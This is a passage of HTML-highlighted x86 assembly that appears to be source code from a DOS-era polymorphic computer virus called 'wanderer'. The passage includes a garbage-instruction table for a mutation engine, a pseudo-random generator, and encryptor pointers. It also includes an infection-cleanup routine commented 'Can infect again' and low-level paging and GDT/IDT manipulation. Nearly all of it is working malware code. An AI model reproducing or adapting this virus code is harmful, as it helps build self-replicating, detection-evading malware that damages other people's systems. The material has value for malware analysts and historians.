</span><span class="sc5">garbage_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; TEST ??,imm8 :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">23h</span><span class="sc0">             </span><span class="sc1">; 2 fixes, 3 bytes</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; Generate always, in loop, 100%</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_MODRM</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Function F_I_MODRM in byte 1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_BYTE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Function F_G_BYTE in byte 2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc0">            </span><span class="sc1">; byte 0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; byte 1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; byte 2</span><span class="sc0">

</span><span class="sc1">; 1 byte opcodes (CLC, STC, CLI, STI, CLD, STD) :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_ADD_0_5</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F8h</span><span class="sc0">

</span><span class="sc1">; Jxx :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0">     </span><span class="sc1">; Don't gen a Jxx when another is being gen</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_JXX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Arithmetic ops :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_OP_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">F_G_WORD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; DEC reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">48h</span><span class="sc0">

</span><span class="sc1">; NOP or XCHG AX,reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc1">; ROL,ROR,RCL,... reg,1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_OP_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D1h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc0">

</span><span class="sc1">; NOP or XCHG AX,reg :  This entry is duplicated !?</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc1">; NEG reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F7h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D8h</span><span class="sc0">

</span><span class="sc1">; CMP xx,reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REGRMMOD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; MOV reg,xxxx :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">23h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_WORD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; INC reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">

</span><span class="sc1">; IN AL,xx :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_BYTE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E4h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; MOV reg8,[xxxx] :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG_PRESERVE_MODRM</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_WORD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; CMP byte ptr [reg+(reg)+imm16],imm8 :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">35h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_RM</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_WORD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_G_BYTE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; NOT reg :</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REG</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F7h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D0h</span><span class="sc0">

</span><span class="sc1">; OR reg,...</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">F_I_REGRMMOD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Eh</span><span class="sc0">             </span><span class="sc1">; End of garbage table mark</span><span class="sc0">


</span><span class="sc5">jmp_ofs</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Wasted byte!</span><span class="sc0">
</span><span class="sc5">garbagetogen</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg_sp</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; SP register</span><span class="sc0">
</span><span class="sc5">reg_counter</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">
</span><span class="sc5">indexreg_op2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">; Wasted byte!</span><span class="sc0">
</span><span class="sc5">in_loop</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">initialize_random_seed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Get current time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; Hours + minutes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; Seconds + hundredths of second</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">get_n_random</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; Returns pseudo-random value in [0..(AX-1)]</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mult_const</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc5">mult_const</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8405h</span><span class="sc0">
</span><span class="sc5">random1</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">random2</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encryptor_ptr</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_encryptor</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ofs_endencryptor</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_encryptor</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">kill_copy4infection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">infecting</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Can infect again</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">data0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_esp</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">wanderer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">STACK_SIZE</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">       </span><span class="sc1">; rep movsd (TASM FIX)</span><span class="sc0">
                                                </span><span class="sc1">; Restore stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">; Restore pages allocated by infection procedure</span><span class="sc0">
</span><span class="sc5">l_restore_pages</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_pages</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">map_page</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; Next 4KB</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Next page</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; old_page1,2 and 3 restored?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_restore_pages</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
</span><span class="sc5">exit_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">   
                </span><span class="sc6">iretd</span><span class="sc0">                   </span><span class="sc1">; Return to original caller</span><span class="sc0">

</span><span class="sc1">; Format of a Page Table Entry</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   31                                  12 11                      0</span><span class="sc0">
</span><span class="sc1">;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÑÍÍÍÑÍÑÍÑÍÍÍÑÍÑÍÑÍ»</span><span class="sc0">
</span><span class="sc1">;  º                                      ³       ³   ³ ³ ³   ³U³R³ º</span><span class="sc0">
</span><span class="sc1">;  º      PAGE FRAME ADDRESS 31..12       ³ AVAIL ³0 0³D³A³0 0³/³/³Pº</span><span class="sc0">
</span><span class="sc1">;  º                                      ³       ³   ³ ³ ³   ³S³W³ º</span><span class="sc0">
</span><span class="sc1">;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÏÍÍÍÏÍÏÍÏÍÍÍÏÍÏÍÏÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   P      - PRESENT</span><span class="sc0">
</span><span class="sc1">;   R/W    - READ/WRITE</span><span class="sc0">
</span><span class="sc1">;   U/S    - USER/SUPERVISOR</span><span class="sc0">
</span><span class="sc1">;   D      - DIRTY</span><span class="sc0">
</span><span class="sc1">;   AVAIL  - AVAILABLE FOR SYSTEMS PROGRAMMER USE</span><span class="sc0">
</span><span class="sc1">;   NOTE: 0 INDICATES INTEL RESERVED. DO NOT DEFINE.</span><span class="sc0">

</span><span class="sc5">map_page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pagetable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">][</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Read page in page table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">][</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Store new page in page table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cr3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cr3</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">setup_system_regs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">virus_cs</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">GDTR</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Calculate GDTR phys address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">addr_GDTR</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IDTR</span><span class="sc4">-</span><span class="sc5">GDTR</span><span class="sc0">           </span><span class="sc1">; Calculate IDTR phys address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">addr_IDTR</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">addr_dir_page</span><span class="sc0">
